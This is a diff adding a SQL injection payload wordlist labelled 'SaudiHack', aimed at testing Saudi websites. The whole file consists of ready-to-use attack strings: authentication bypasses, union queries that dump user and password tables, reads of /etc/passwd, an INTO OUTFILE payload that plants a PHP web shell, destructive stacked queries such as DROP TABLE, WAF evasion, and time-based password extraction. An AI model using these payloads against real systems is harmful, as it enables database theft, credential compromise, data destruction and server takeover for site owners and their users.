@@ -1,0 +1,147 @@
+# SaudiHack SQL Injection Payloads Wordlist
+# Advanced SQL Injection payloads for Saudi websites testing
+# Categorized by vulnerability type and database system
+
+# Basic SQL Injection
+'
+"
+1' OR '1'='1
+1" OR "1"="1
+1' OR 1=1--
+1" OR 1=1--
+1' OR 1=1#
+1" OR 1=1#
+1' OR '1'='1'/*
+1" OR "1"="1"/*
+
+# Error-Based SQL Injection
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
+1' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns))--
+1' AND 1=(SELECT COUNT(*) FROM sysobjects)--
+1' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+
+# Union-Based SQL Injection
+1' UNION SELECT 1,2,3--
+1' UNION SELECT 1,2,3,4,5--
+1' UNION SELECT null,null,null--
+1' UNION SELECT 1,@@version,3--
+1' UNION SELECT 1,database(),user()--
+
+# Blind SQL Injection (Boolean)
+1' AND 1=1--
+1' AND 1=2--
+1' AND substring(@@version,1,1)='1'--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND (SELECT COUNT(*) FROM users)>0--
+
+# Blind SQL Injection (Time-Based)
+1' WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=1,0,5))))a))--
+1' AND IF(1=1,SLEEP(5),0)--
+
+# MySQL Specific
+1' UNION SELECT 1,2,3 FROM information_schema.tables--
+1' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns--
+1' AND (SELECT * FROM users WHERE username='admin')--
+1' UNION SELECT user,password FROM mysql.user--
+1' UNION SELECT load_file('/etc/passwd'),2,3--
+
+# PostgreSQL Specific
+1' UNION SELECT 1,2,3 FROM pg_tables--
+1' UNION SELECT schemaname,tablename,tableowner FROM pg_tables--
+1' UNION SELECT usename,passwd FROM pg_shadow--
+1' UNION SELECT current_database(),current_user,version()--
+1' UNION SELECT datname,datdba FROM pg_database--
+
+# MSSQL Specific
+1' UNION SELECT 1,2,3 FROM sysobjects--
+1' UNION SELECT name,id FROM sysobjects WHERE xtype='U'--
+1' UNION SELECT name,id FROM syscolumns--
+1' UNION SELECT name,crdate FROM sysobjects--
+1' UNION SELECT name,password FROM master..syslogins--
+
+# Oracle Specific
+1' UNION SELECT 1,2,3 FROM all_tables--
+1' UNION SELECT owner,table_name FROM all_tables--
+1' UNION SELECT username,password FROM dba_users--
+1' UNION SELECT table_name,column_name FROM all_tab_columns--
+1' UNION SELECT banner,1 FROM v$version--
+
+# Advanced Payloads
+1' OR 1=1 INTO OUTFILE '/tmp/test.txt'--
+1' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'--
+1' UNION SELECT '<?php system($_GET[cmd]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+1' AND 1=2 UNION SELECT 1,2,load_file('/etc/passwd')--
+
+# Authentication Bypass
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1--
+') OR ('1'='1--
+1' OR 1=1 OR '1'='1
+1' OR 1=1 LIMIT 1--
+
+# Data Extraction
+1' UNION SELECT 1,2,3 FROM users--
+1' UNION SELECT username,password,email FROM users--
+1' UNION SELECT table_name,column_name,1 FROM information_schema.columns--
+1' UNION SELECT user,password,1 FROM users--
+
+# Column Count Detection
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+
+# String Concatenation
+1' UNION SELECT CONCAT(username,':',password),2,3 FROM users--
+1' UNION SELECT username||':'||password,2,3 FROM users--
+1' UNION SELECT username+':'+password,2,3 FROM users--
+
+# Conditional Statements
+1' AND IF(1=1,1,0)--
+1' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--
+1' AND 1=(CASE WHEN 1=1 THEN 1 ELSE 0 END)--
+1' AND 1=(IF(1=1,1,0))--
+
+# Stacked Queries
+1'; SELECT * FROM users--
+1'; DROP TABLE users--
+1'; INSERT INTO users VALUES('hacker','password')--
+1'; UPDATE users SET password='hacked'--
+
+# WAF Bypass
+1'/**/OR/**/1=1--
+1'/*!50000OR*/1=1--
+1'/*!12345UNION*/ SELECT 1,2,3--
+1' UNI/**/ON SELECT 1,2,3--
+1' %4f%52 1=1--
+
+# Second-Order SQL Injection
+1';
+1' OR 1=1;
+1' UNION SELECT 1,2,3;
+1' AND 1=1;
+
+# JSON-Based SQL Injection
+{"name": "1' OR 1=1--"}
+{"id": "1' UNION SELECT 1,2,3--"}
+{"username": "admin'--"}
+{"password": "1' OR 1=1--"}
+
+# GraphQL SQL Injection
+{"query": "{ users(filter: \"1' OR 1=1--\") { id name } }"}
+{"query": "{ users(filter: \"1' UNION SELECT 1,2,3--\") { id name } }"}
+
+# Time-based Data Extraction
+1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--
+1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96,SLEEP(5),0)--
+1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>112,SLEEP(5),0)--
